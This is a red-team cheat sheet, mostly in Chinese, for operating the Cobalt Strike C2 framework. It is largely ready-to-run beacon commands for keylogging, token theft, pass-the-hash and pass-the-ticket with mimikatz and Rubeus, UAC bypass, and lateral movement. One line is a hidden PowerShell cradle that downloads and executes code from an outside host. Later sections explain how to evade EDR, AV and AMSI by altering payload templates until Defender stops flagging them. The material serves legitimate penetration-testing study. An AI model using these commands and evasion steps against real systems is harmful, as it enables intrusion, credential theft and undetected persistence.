# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### 监听器

### C2 监听器

`Cobalt Strike -> Listeners -> Add/Edit` 然后你可以选择监听的位置、使用哪种类型的 beacon（http、dns、smb...）等。

### Peer2Peer 监听器

这些监听器的 beacons 不需要直接与 C2 通信，它们可以通过其他 beacons 与 C2 通信。

`Cobalt Strike -> Listeners -> Add/Edit` 然后你需要选择 TCP 或 SMB beacons

* The **TCP beacon will set a listener in the port selected**. To connect to a TCP beacon use the command `connect <ip> <port>` from another beacon
* The **smb beacon will listen in a pipename with the selected name**. To connect to a SMB beacon you need to use the command `link [target] [pipe]`.

### 生成 & 托管 payloads

#### 在文件中生成 payloads

`Attacks -> Packages ->`

* **`HTMLApplication`** 用于 HTA 文件
* **`MS Office Macro`** 用于包含宏的 Office 文档
* **`Windows Executable`** 用于 .exe、.dll 或 service .exe
* **`Windows Executable (S)`** 用于 **stageless** .exe、.dll 或 service .exe（stageless 通常优于 staged，产生更少 IoCs）

#### 生成 & 托管 payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` 这会生成一个脚本/可执行文件，用于以诸如 bitsadmin、exe、powershell 和 python 等格式从 Cobalt Strike 下载 beacon。

#### 托管 Payloads

如果你已经有想在 web 服务器上托管的文件，只需转到 `Attacks -> Web Drive-by -> Host File`，选择要托管的文件并配置 web server。

### Beacon 选项

<details>
<summary>Beacon 选项和命令</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # This uses the highest supported powershell version (not oppsec)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket in the attacker machine from a poweshell session & load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump insteresting ticket by luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   wmi lateral movement with msbuild inline c# task (oppsec)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On metaploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### 自定义植入物 / Linux Beacons

- 自定义 agent 只需要讲 Cobalt Strike Team Server HTTP/S 协议（默认 malleable C2 profile）以注册/签到并接收任务。实现 profile 中定义的相同 URIs/headers/metadata 加密以复用 Cobalt Strike UI 进行下发和输出。
- 一个 Aggressor Script（例如 `CustomBeacon.cna`）可以封装针对非 Windows beacon 的 payload 生成，使操作员可以从 GUI 直接选择 listener 并生成 ELF payloads。
- 暴露给 Team Server 的示例 Linux 任务处理器包括：`sleep`、`cd`、`pwd`、`shell`（执行任意命令）、`ls`、`upload`、`download` 和 `exit`。这些对应 Team Server 期望的 task ID，必须在服务端实现并以正确格式返回输出。
- 可通过加载 TrustedSec 的 ELFLoader（https://github.com/trustedsec/ELFLoader，亦支持 Outflank-style BOFs）在进程内添加 BOF 支持，从而允许模块化的 post-exploitation 在植入体的上下文/权限内运行而不产生新进程。
- 在自定义 beacon 中嵌入 SOCKS 处理器以与 Windows Beacons 保持通道等价：当操作员运行 `socks <port>` 时，植入体应打开本地代理，将操作员工具链通过被控 Linux 主机路由到内部网络。

## Opsec

### Execute-Assembly

The **`execute-assembly`** 使用一个 **牺牲进程（sacrificial process）**，通过远程进程注入来执行指定程序。注入到进程内会调用一些常被 EDR 检测的 Win API，因此噪声很大。不过，有一些自定义工具可以用于将内容加载到同一进程中：

- https://github.com/anthemtotheego/InlineExecute-Assembly
- https://github.com/kyleavery/inject-assembly
- 在 Cobalt Strike 中也可以使用 BOF (Beacon Object Files)：https://github.com/CCob/BOF.NET

aggressor 脚本 https://github.com/outflanknl/HelpColor 会在 Cobalt Strike 中创建 `helpx` 命令，该命令会给命令着色以指示它们是否为 BOFs（绿色）、是否为 Frok&Run（黄色）或类似的，或是否为 ProcessExecution、注入等（红色）。这有助于识别哪些命令更隐蔽。

### 作为用户行动

可以查看类似 `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents` 的事件：

- Security EID 4624 - 检查所有交互式登录以了解常见的操作时间段。
- System EID 12,13 - 检查关机/启动/睡眠的频率。
- Security EID 4624/4625 - 检查入站的有效/无效 NTLM 尝试。
- Security EID 4648 - 当以明文凭证登录时会生成此事件。如果由某个进程生成，则该二进制可能在配置文件或代码中以明文形式包含凭证。

在从 cobalt strike 使用 `jump` 时，最好使用 `wmi_msbuild` 方法以使新进程看起来更合法。

### 使用计算机账号

防御方通常会检查用户产生的异常行为并经常**在监控中排除 service accounts 和像 `*$` 的 computer accounts**。你可以使用这些账户来执行横向移动或权限提升。

### 使用 stageless payloads

与分阶段（staged）payloads 相比，stageless payloads 噪声更小，因为它们不需要从 C2 服务器下载第二阶段。这意味着初始连接后不会产生额外网络流量，从而降低被基于网络的防御检测的可能性。

### Tokens & Token Store

窃取或生成 token 时要小心，因为 EDR 可能会枚举所有线程的 token 并发现属于不同用户甚至 SYSTEM 的 token。

这允许为每个 beacon 存储 tokens，从而无需反复窃取相同的 token。这对横向移动或需要多次使用被窃取 token 的情况很有用：

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

在进行横向移动时，通常比生成新 token 或执行 pass the hash 攻击更好地选择**窃取一个 token**。

### Guardrails

Cobalt Strike 有一个名为 **Guardrails** 的功能，用于阻止可能被防御者检测到的某些命令或操作。Guardrails 可配置为阻止特定命令，例如 `make_token`、`jump`、`remote-exec` 等，通常这些命令被用于横向移动或权限提升。

此外，仓库 https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks 也包含一些在执行 payload 前可以考虑的检查和思路。

### Tickets encryption

在 AD 环境中要注意票据的加密方式。默认情况下，一些工具会为 Kerberos tickets 使用 RC4 加密，而这比 AES 更弱；现代更新的环境通常默认使用 AES。防御者可以通过检测弱加密算法来识别可疑活动。

### 避免默认项

使用 Cobalt Stricke 时默认 SMB pipe 名称通常为 `msagent_####` 和 `"status_####`，应修改这些名称。可以使用命令 `ls \\.\pipe\` 检查 Cobalt Strike 创建的现有 pipe 名称。

此外，SSH 会话会创建名为 `\\.\pipe\postex_ssh_####` 的 pipe。使用 `set ssh_pipename "<new_name>";` 更改它。

在 poext exploitation 攻击中，pipe `\\.\pipe\postex_####` 也可以用 `set pipename "<new_name>"` 修改。

在 Cobalt Strike profile 中你还可以调整例如：

- 避免使用 `rwx`
- 在 `process-inject {...}` 块中控制进程注入行为（将使用哪些 APIs）
- 在 `post-ex {…}` 块中控制 "fork and run" 的行为
- sleep 时间
- 要加载到内存中的二进制的最大大小
- 使用 `stage {...}` 块控制内存占用和 DLL 内容
- 网络流量特征

### 绕过内存扫描

一些 EDR 会扫描内存以查找已知恶意签名。Cobalt Strike 允许将 `sleep_mask` 函数作为 BOF 修改，从而在内存中对后门进行加密以降低检测概率。

### 噪声大的进程注入

向进程注入代码通常会产生大量噪声，因为普通进程很少执行此类操作且可用的方法有限，因此可能被基于行为的检测系统发现。此外，EDR 也可能在网络上扫描那些“线程中含有不在磁盘上的代码”的进程（尽管像浏览器使用 JIT 的场景较常见）。示例：https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2

### Spawnas | PID 和 PPID 关系

创建新进程时，保持进程间的正常父子关系对于避免检测很重要。例如，如果 svchost.exec 正在执行 iexplorer.exe 会显得可疑，因为在正常 Windows 环境中 svchost.exe 并不是 iexplorer.exe 的父进程。

当在 Cobalt Strike 中生成新 beacon 时，默认会创建一个使用 **`rundll32.exe`** 的进程来运行新的 listener。这并不隐蔽，且很容易被 EDR 检测到。此外，`rundll32.exe` 通常无参数运行，这让它更可疑。

使用下面的 Cobalt Strike 命令，你可以指定不同的进程来生成新 beacon，从而降低可检测性：
```bash
spawnto x86 svchost.exe
```
你也可以在配置文件中更改这些设置 **`spawnto_x86` 和 `spawnto_x64`**。

### 代理攻击者流量

攻击者有时需要能够在本地运行工具，甚至在 linux 机器上，并使受害者的流量到达该工具（例如 NTLM relay）。

此外，有时在进行 pass-the.hash 或 pass-the-ticket 攻击时，攻击者在本地将该 hash 或 ticket **添加到他自己的 LSASS 进程中**，然后从中 pivot，比修改受害者机器的 LSASS 进程更隐蔽。

不过，你需要对**生成的流量保持警惕**，因为你可能会从你的 backdoor 进程发送不常见的流量（例如 kerberos？）。为此，你可以 pivot 到一个 browser 进程（尽管将自己注入到一个进程中可能会被发现，所以要考虑一个更隐蔽的方式）。


### 规避 AV

#### AV/AMSI/ETW 绕过

查看页面：


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

通常在 `/opt/cobaltstrike/artifact-kit` 中可以找到 payloads 的代码和预编译模板（位于 `/src-common`），这些是 cobalt strike 将用于生成二进制 beacon 的。

将 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) 与生成的 backdoor（或仅与已编译的模板）一起使用，可以找出导致 defender 触发的原因。通常是一个字符串。因此，你可以修改生成 backdoor 的代码，使该字符串不会出现在最终的二进制文件中。

修改代码后，只需在同一目录下运行 `./build.sh`，然后将 `dist-pipe/` 文件夹复制到 Windows 客户端的 `C:\Tools\cobaltstrike\ArtifactKit` 中。
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
别忘了加载激进脚本 `dist-pipe\artifact.cna`，以告知 Cobalt Strike 使用我们想要的磁盘资源而不是已加载的那些。

#### 资源包

ResourceKit 文件夹包含 Cobalt Strike 基于脚本的 payload 模板，包括 PowerShell、VBA 和 HTA。

使用 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) 配合这些模板，你可以找出 defender（在本例中为 AMSI）不喜欢的部分并进行修改：
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
通过修改被检测到的行，可以生成一个不会被捕获的模板。

不要忘记加载激进脚本 `ResourceKit\resources.cna`，以指示 Cobalt Strike 使用我们希望从磁盘加载的资源，而不是已加载的那些。

#### Function hooks | Syscall

Function hooking 是 ERDs 用于检测恶意活动的一种非常常见的方法。Cobalt Strike 允许你通过在 malleable profile 中使用 **`None`** 配置改用 **syscalls**（而不是标准 Windows API 调用），或者使用带有 **`Direct`** 设置的 `Nt*` 版本函数，或者使用 **`Indirect`** 选项直接跳过 `Nt*` 函数，从而绕过这些 hook。具体系统不同，某个选项可能比另一个更隐蔽。

这可以在配置文件中设置，或使用命令 **`syscall-method``** 。

不过，这也可能产生噪声。

Cobalt Strike 提供的一个绕过函数 hook 的选项是使用： [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof) 来移除这些 hook。

你也可以使用 [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) 或 [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector) 来检查哪些函数被 hook。




<details>
<summary>Cobalt Strike 杂项命令</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## 参考资料

- [Cobalt Strike Linux Beacon (custom implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [Outflank nix BOF template](https://github.com/outflanknl/nix_bof_template)
- [Unit42 对 Cobalt Strike metadata encryption 的分析](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [SANS ISC 关于 Cobalt Strike 流量的日记](https://isc.sans.edu/diary/27968)
- [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)

{{#include ../banners/hacktricks-training.md}}
